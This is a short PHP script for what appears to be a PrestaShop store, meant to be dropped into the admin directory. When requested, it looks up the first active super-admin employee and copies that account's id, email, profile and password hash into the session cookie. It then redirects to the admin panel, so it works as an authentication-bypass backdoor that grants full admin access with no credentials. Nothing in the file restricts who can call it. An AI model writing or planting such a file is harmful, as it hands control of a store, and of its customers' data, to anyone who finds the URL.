<?php
//put it in admin dir
if (!defined('_PS_ADMIN_DIR_'))
	define('_PS_ADMIN_DIR_', getcwd());
if (!defined('PS_ADMIN_DIR'))
	define('PS_ADMIN_DIR', _PS_ADMIN_DIR_);
require(_PS_ADMIN_DIR_.'/../config/config.inc.php');
require(_PS_ADMIN_DIR_.'/functions.php');
$context = Context::getContext();
$employers = Db::getInstance()->ExecuteS('SELECT * FROM `'._DB_PREFIX_.'employee`');
$admin = false;
$admin = new Employee();
foreach($employers as $emp){
	if($emp['active'] == 1){
		$admin = $admin->getByEmail($emp['email']);
		if($admin->isSuperAdmin()){
			break;
		}
	}
}
$admin->remote_addr = ip2long(Tools::getRemoteAddr());
$context->employee = $admin;
$cookie = $context->cookie;
$cookie->id_employee = $admin->id;
$cookie->email = $admin->email;
$cookie->profile = $admin->id_profile;
$cookie->passwd = $admin->passwd;
$cookie->remote_addr = $admin->remote_addr;
header('Location: /admin9599');
?>